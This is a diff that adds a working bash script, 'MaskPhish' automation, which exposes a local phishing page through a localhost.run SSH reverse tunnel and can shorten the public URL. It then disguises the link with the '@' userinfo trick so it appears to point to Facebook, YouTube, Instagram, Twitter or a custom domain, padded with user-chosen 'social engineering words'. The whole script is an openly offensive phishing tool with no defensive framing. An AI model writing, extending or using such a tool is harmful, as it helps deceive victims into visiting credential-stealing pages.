@@ -1,0 +1,137 @@
+#!/bin/bash
+clear
+# === Colors ===
+RED="\033[1;31m"
+GREEN="\033[1;32m"
+YELLOW="\033[1;33m"
+BLUE="\033[1;34m"
+MAGENTA="\033[1;35m"
+RESET="\033[0m"
+
+# === URL Shortener Function ===
+shorten_url() {
+  local long_url="$1"
+  local short
+
+  # Try is.gd
+  short=$(curl -s -G --data-urlencode "url=${long_url}" https://is.gd/create.php?format=simple)
+  [[ "$short" =~ ^https?:// ]] && echo "$short" && return
+
+  # Try tinyurl
+  short=$(curl -s "https://tinyurl.com/api-create.php?url=${long_url}")
+  [[ "$short" =~ ^https?:// ]] && echo "$short" && return
+
+  # Try cleanuri
+  short=$(curl -s -X POST -d "url=${long_url}" https://cleanuri.com/api/v1/shorten | grep -oP '"result_url":"\K[^"]+')
+  [[ "$short" =~ ^https?:// ]] && echo "$short" && return
+
+  # Fallback to original
+  echo "$long_url"
+}
+
+echo -e "${BLUE}====== SSH Tunnel + MaskPhish Automation ======${RESET}"
+
+# Ask for port
+echo -ne "${MAGENTA}Enter local port to expose (e.g. 8080): ${RESET}"
+read PORT
+
+# Start SSH tunnel in background and capture output
+TMPFILE=$(mktemp)
+ssh -o StrictHostKeyChecking=no -R 80:localhost:$PORT nokey@localhost.run > "$TMPFILE" 2>&1 &
+
+TUNNEL_PID=$!
+
+echo -e "${YELLOW}[*] Starting tunnel on port $PORT... Please wait...${RESET}"
+
+# Wait up to 15 seconds for the .lhr.life URL to appear
+for i in {1..15}; do
+  sleep 1
+  URL=$(grep -oE "https://[a-zA-Z0-9]+\.lhr\.life" "$TMPFILE")
+  if [ ! -z "$URL" ]; then
+    break
+  fi
+done
+
+# Check if URL was found
+if [ -z "$URL" ]; then
+  echo -e "${RED}[!] Failed to fetch public tunnel URL.${RESET}"
+  cat "$TMPFILE"
+  kill "$TUNNEL_PID" 2>/dev/null
+  exit 1
+fi
+
+echo -e "${GREEN}[+] Public tunnel URL: ${URL}${RESET}"
+
+# Ask whether to shorten the URL
+echo -ne "${MAGENTA}Do you want to shorten this URL before masking? (y/n): ${RESET}"
+read SHORT_CHOICE
+
+if [[ "$SHORT_CHOICE" == "y" || "$SHORT_CHOICE" == "Y" ]]; then
+  SHORT_URL=$(shorten_url "$URL")
+  echo -e "${GREEN}[+] Shortened URL: ${YELLOW}${SHORT_URL}${RESET}"
+else
+  SHORT_URL="$URL"
+fi
+
+# Ask whether to mask the URL
+echo -ne "${MAGENTA}Do you want to mask the URL? (y/n): ${RESET}"
+read MASK_CHOICE
+
+if [[ "$MASK_CHOICE" == "y" || "$MASK_CHOICE" == "Y" ]]; then
+  # ========== Protocol selection ==========
+  echo -e "\n${BLUE}Choose protocol:${RESET}"
+  echo -e "${YELLOW}1) http\n2) https${RESET}"
+  echo -ne "${MAGENTA}Enter choice [1-2]: ${RESET}"
+  read PROTO_CHOICE
+
+  if [ "$PROTO_CHOICE" == "1" ]; then
+    PROTO="http"
+  else
+    PROTO="https"
+  fi
+
+  # ========== Domain selection ==========
+  echo -e "\n${BLUE}Choose masking domain:${RESET}"
+  echo -e "${YELLOW}1) Facebook\n2) YouTube\n3) Instagram\n4) Twitter\n5) Custom domain${RESET}"
+  echo -ne "${MAGENTA}Enter choice [1-5]: ${RESET}"
+  read DOMAIN_CHOICE
+
+  case $DOMAIN_CHOICE in
+    1) DOMAIN="facebook.com" ;;
+    2) DOMAIN="youtube.com" ;;
+    3) DOMAIN="instagram.com" ;;
+    4) DOMAIN="twitter.com" ;;
+    5) echo -ne "${MAGENTA}Enter your custom domain (without http/https): ${RESET}"
+       read DOMAIN ;;
+    *) echo -e "${RED}❌ Invalid choice. Exiting.${RESET}" && kill "$TUNNEL_PID" && exit 1 ;;
+  esac
+
+  MASK="${PROTO}://${DOMAIN}"
+
+  # ========== SE Words ==========
+  echo -ne "${MAGENTA}Enter social engineering words (e.g. free-gift): ${RESET}"
+  read SE_TEXT
+
+  # ========== Final masked URL ==========
+  SHORT_DOMAIN=$(echo "$SHORT_URL" | sed 's|https\?://||')
+  FINAL_URL="${MASK}-${SE_TEXT}@${SHORT_DOMAIN}"
+
+  echo -e "\n${GREEN}✅ Masked Phishing URL:${RESET}"
+  echo -e "${YELLOW}${FINAL_URL}${RESET}"
+
+else
+  FINAL_URL="$SHORT_URL"
+  echo -e "\n${GREEN}🌐 Public/Shortened URL:${RESET}"
+  echo -e "${YELLOW}${FINAL_URL}${RESET}"
+fi
+
+# Ask whether to close tunnel
+echo -ne "\n${MAGENTA}Do you want to close the SSH tunnel now? (y/n): ${RESET}"
+read CLOSE_CHOICE
+
+if [[ "$CLOSE_CHOICE" == "y" || "$CLOSE_CHOICE" == "Y" ]]; then
+  kill "$TUNNEL_PID" 2>/dev/null
+  echo -e "${GREEN}✅ SSH tunnel closed.${RESET}"
+else
+  echo -e "${YELLOW}⚠️ SSH tunnel is still running in background. Use 'kill $TUNNEL_PID' to stop it later.${RESET}"
+fi
